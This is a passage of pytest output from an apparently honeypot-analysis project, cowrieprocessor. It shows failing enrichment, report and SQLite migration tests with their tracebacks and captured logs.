            from process_cowrie import dshield_query, read_spur_data, safe_read_uh_data
    
            # All should fail gracefully
>           dshield_result = dshield_query("192.168.1.180")

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:585: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/process_cowrie.py:1474: in dshield_query
    result = enrichment_dshield_query(
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1169: in __call__
    return self._mock_call(*args, **kwargs)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1173: in _mock_call
    return self._execute_mock_call(*args, **kwargs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <MagicMock name='enrichment_dshield_query' id='131214247173760'>
args = ('192.168.1.180', '')
kwargs = {'cache_base': PosixPath('/mnt/dshield/data/cache/cowrieprocessor'), 'now': <built-in function time>, 'session_factory': <function session at 0x7756b4cb4900>, 'skip_enrich': False, ...}
effect = Exception('DShield API down')

    def _execute_mock_call(self, /, *args, **kwargs):
        # separate from _increment_mock_call so that awaited functions are
        # executed separately from their call, also AsyncMock overrides this method
    
        effect = self.side_effect
        if effect is not None:
            if _is_exception(effect):
>               raise effect
E               Exception: DShield API down

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1228: Exception
_____ TestEnrichmentPerformanceScenarios.test_bulk_enrichment_performance ______

self = <test_enrichment_integration.TestEnrichmentPerformanceScenarios object at 0x7756b4526d50>
test_database = PosixPath('/tmp/tmplmy6e27_.sqlite')

    def test_bulk_enrichment_performance(self, test_database) -> None:
        """Test enrichment performance with many sessions."""
        # Create many test sessions
        sessions = []
        for i in range(50):  # 50 sessions
            session_data = {
                "session": f"bulk_session_{i}",
                "src_ip": f"192.168.1.{200 + i}",
                "start_time": f"2025-01-01T10:{i:02d}:00",
                "commands": [f"command_{i}"],
            }
            sessions.append(session_data)
    
            conn = sqlite3.connect(test_database)
            conn.execute(
                """
                INSERT INTO sessions (session, src_ip, start_time, commands)
                VALUES (?, ?, ?, ?)
            """,
                (
                    session_data["session"],
                    session_data["src_ip"],
                    session_data["start_time"],
                    json.dumps(session_data["commands"]),
                ),
            )
            conn.commit()
            conn.close()
    
        # Mock enrichment for performance testing
        with (
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):
            mock_dshield.return_value = json.loads(get_dshield_response("datacenter"))
            mock_spur.return_value = json.loads(get_spur_response("datacenter"))
    
            import time
    
            from process_cowrie import dshield_query, read_spur_data
    
            # Measure enrichment time for bulk processing
            start_time = time.time()
    
            for session_data in sessions:
                dshield_query(session_data["src_ip"])
>               read_spur_data(session_data["src_ip"], "test-key")
E               TypeError: read_spur_data() takes 1 positional argument but 2 were given

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:644: TypeError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:31,118:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
------------------------------ Captured log call -------------------------------
DEBUG    root:process_cowrie.py:867 Database transaction committed
___ TestEnrichmentInSessionReports.test_session_report_includes_dshield_data ___

self = <test_enrichment_reports.TestEnrichmentInSessionReports object at 0x7756b4527250>
test_database_with_enrichment = PosixPath('/tmp/tmptpnm5m2n.sqlite')

    def test_session_report_includes_dshield_data(self, test_database_with_enrichment) -> None:
        """Test that DShield data appears in session reports."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Query session with DShield enrichment
        cursor = conn.execute(
            """
            SELECT session, src_ip, dshield_asn, dshield_country
            FROM sessions
            WHERE session = ?
        """,
            ("enriched_session_1",),
        )
    
>       session = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:198: ValueError
____ TestEnrichmentInSessionReports.test_session_report_includes_spur_data _____

self = <test_enrichment_reports.TestEnrichmentInSessionReports object at 0x7756b4527390>
test_database_with_enrichment = PosixPath('/tmp/tmpipvt9bpg.sqlite')

    def test_session_report_includes_spur_data(self, test_database_with_enrichment) -> None:
        """Test that SPUR data appears in session reports."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Query session with SPUR enrichment
        cursor = conn.execute(
            """
            SELECT session, src_ip, spur_data
            FROM sessions
            WHERE session = ?
        """,
            ("enriched_session_1",),
        )
    
>       session = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:226: ValueError
___ TestEnrichmentInSessionReports.test_session_report_includes_urlhaus_data ___

self = <test_enrichment_reports.TestEnrichmentInSessionReports object at 0x7756b4570fc0>
test_database_with_enrichment = PosixPath('/tmp/tmpqbvakkdo.sqlite')

    def test_session_report_includes_urlhaus_data(self, test_database_with_enrichment) -> None:
        """Test that URLHaus data appears in session reports."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Query session with URLHaus enrichment
        cursor = conn.execute(
            """
            SELECT session, src_ip, urlhaus_tags
            FROM sessions
            WHERE session = ?
        """,
            ("enriched_session_1",),
        )
    
>       session = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:258: ValueError
_ TestEnrichmentInSessionReports.test_multiple_sessions_enrichment_consistency _

self = <test_enrichment_reports.TestEnrichmentInSessionReports object at 0x7756b45710f0>
test_database_with_enrichment = PosixPath('/tmp/tmpjx3fxamt.sqlite')

    def test_multiple_sessions_enrichment_consistency(self, test_database_with_enrichment) -> None:
        """Test that enrichment data is consistent across multiple sessions."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Query all sessions with enrichment
        cursor = conn.execute("""
            SELECT session, src_ip, dshield_asn, dshield_country, spur_data, urlhaus_tags
            FROM sessions
            ORDER BY session
        """)
    
>       sessions = [dict(row) for row in cursor.fetchall()]
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:281: ValueError
________ TestEnrichmentInFileReports.test_file_report_includes_vt_data _________

self = <test_enrichment_reports.TestEnrichmentInFileReports object at 0x7756b45274d0>
test_database_with_enrichment = PosixPath('/tmp/tmp6y83tr2h.sqlite')

    def test_file_report_includes_vt_data(self, test_database_with_enrichment) -> None:
        """Test that VirusTotal data appears in file reports."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Query files with VT enrichment
        cursor = conn.execute("""
            SELECT session, filename, shasum, vt_description, vt_classification, vt_malicious, vt_first_seen
            FROM files
            ORDER BY session
        """)
    
>       files = [dict(row) for row in cursor.fetchall()]
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:326: ValueError
_______ TestEnrichmentInFileReports.test_file_report_enrichment_metadata _______

self = <test_enrichment_reports.TestEnrichmentInFileReports object at 0x7756b4527610>
test_database_with_enrichment = PosixPath('/tmp/tmppkveu5oh.sqlite')

    def test_file_report_enrichment_metadata(self, test_database_with_enrichment) -> None:
        """Test that file report includes comprehensive enrichment metadata."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Get file with enrichment and related session data
        cursor = conn.execute(
            """
            SELECT f.*, s.src_ip, s.dshield_asn, s.dshield_country
            FROM files f
            JOIN sessions s ON f.session = s.session
            WHERE f.session = ?
        """,
            ("enriched_session_1",),
        )
    
>       file_data = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:361: ValueError
_ TestReportEnrichmentIntegration.test_daily_report_includes_enrichment_summary _

self = <test_enrichment_reports.TestReportEnrichmentIntegration object at 0x7756b4527750>
test_database_with_enrichment = PosixPath('/tmp/tmptncoftah.sqlite')

    def test_daily_report_includes_enrichment_summary(self, test_database_with_enrichment) -> None:
        """Test that daily reports include enrichment summaries."""
        # Mock the report generation process
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Get summary data that would be used for daily reports
>       cursor = conn.execute("""
            SELECT
                COUNT(DISTINCT session) as total_sessions,
                COUNT(DISTINCT src_ip) as unique_ips,
                COUNT(DISTINCT shasum) as unique_files,
                COUNT(CASE WHEN vt_malicious > 0 THEN 1 END) as malicious_files,
                COUNT(DISTINCT dshield_asn) as unique_asns
            FROM sessions s
            LEFT JOIN files f ON s.session = f.session
            WHERE s.start_time >= date('now', '-1 day')
        """)
E       sqlite3.OperationalError: ambiguous column name: session

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:390: OperationalError
_ TestReportEnrichmentIntegration.test_abnormal_activity_report_enrichment_flags _

self = <test_enrichment_reports.TestReportEnrichmentIntegration object at 0x7756b4527890>
test_database_with_enrichment = PosixPath('/tmp/tmpesrl5har.sqlite')

    def test_abnormal_activity_report_enrichment_flags(self, test_database_with_enrichment) -> None:
        """Test that abnormal activity reports flag suspicious enrichment data."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Find sessions with suspicious enrichment data
        cursor = conn.execute("""
            SELECT s.*, COUNT(f.shasum) as file_count
            FROM sessions s
            LEFT JOIN files f ON s.session = f.session
            WHERE s.dshield_asn IS NOT NULL
               OR s.urlhaus_tags IS NOT NULL
               OR f.vt_malicious > 10
            GROUP BY s.session
            HAVING file_count > 0 OR s.urlhaus_tags IS NOT NULL
        """)
    
>       suspicious_sessions = [dict(row) for row in cursor.fetchall()]
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:430: ValueError
__ TestEnrichmentReportFormatting.test_enrichment_data_formatting_consistency __

self = <test_enrichment_reports.TestEnrichmentReportFormatting object at 0x7756b45279d0>
test_database_with_enrichment = PosixPath('/tmp/tmpo5a3cucw.sqlite')

    def test_enrichment_data_formatting_consistency(self, test_database_with_enrichment) -> None:
        """Test that enrichment data is formatted consistently in reports."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Get session with all types of enrichment
        cursor = conn.execute(
            """
            SELECT * FROM sessions WHERE session = ?
        """,
            ("enriched_session_1",),
        )
    
>       session = dict(cursor.fetchone())
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:460: ValueError
___ TestEnrichmentReportFormatting.test_enrichment_tags_parsing_and_display ____

self = <test_enrichment_reports.TestEnrichmentReportFormatting object at 0x7756b4527b10>
test_database_with_enrichment = PosixPath('/tmp/tmpgp9twjrt.sqlite')

    def test_enrichment_tags_parsing_and_display(self, test_database_with_enrichment) -> None:
        """Test that URLHaus tags are properly parsed and displayed."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Get session with URLHaus tags
        cursor = conn.execute("""
            SELECT session, urlhaus_tags FROM sessions WHERE urlhaus_tags IS NOT NULL
        """)
    
>       sessions = [dict(row) for row in cursor.fetchall()]
E       ValueError: dictionary update sequence element #0 has length 18; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:489: ValueError
________ TestEnrichmentReportFormatting.test_vt_classification_display _________

self = <test_enrichment_reports.TestEnrichmentReportFormatting object at 0x7756b4571220>
test_database_with_enrichment = PosixPath('/tmp/tmpziqhc3vf.sqlite')

    def test_vt_classification_display(self, test_database_with_enrichment) -> None:
        """Test that VT classifications are displayed appropriately."""
        conn = sqlite3.connect(test_database_with_enrichment)
    
        # Get files with VT classifications
        cursor = conn.execute("""
            SELECT filename, vt_classification, vt_malicious FROM files WHERE vt_classification IS NOT NULL
        """)
    
>       files = [dict(row) for row in cursor.fetchall()]
E       ValueError: dictionary update sequence element #0 has length 11; 2 is required

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_reports.py:509: ValueError
____________ TestMigrationSystem.test_migration_application_sqlite _____________

self = <test_migration_system.TestMigrationSystem object at 0x7756b43d07d0>

    def test_migration_application_sqlite(self) -> None:
        """Test migration application on SQLite database."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create engine and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Apply migrations
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:31: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b30ae970>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:17,371:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:17,372:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:17,379:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:17,381:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:17,383:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:17,384:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:17,386:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:17,389:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:17,390:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:17,391:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:17,392:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:17,396:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:17,397:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:17,397:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:17,398:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,399:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,399:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,405:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,406:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,406:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________ TestMigrationSystem.test_migration_idempotency_sqlite _____________

self = <test_migration_system.TestMigrationSystem object at 0x7756b43d0910>

    def test_migration_idempotency_sqlite(self) -> None:
        """Test that migrations are idempotent on SQLite."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Apply migrations twice
>           version1 = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:93: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b31b9010>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:17,911:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:17,915:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:17,923:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:17,924:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:17,926:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:17,929:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:17,930:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:17,931:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:17,932:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:17,935:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:17,936:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:17,938:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:17,939:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:17,939:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:17,941:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,942:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,942:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,943:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,943:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:17,944:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
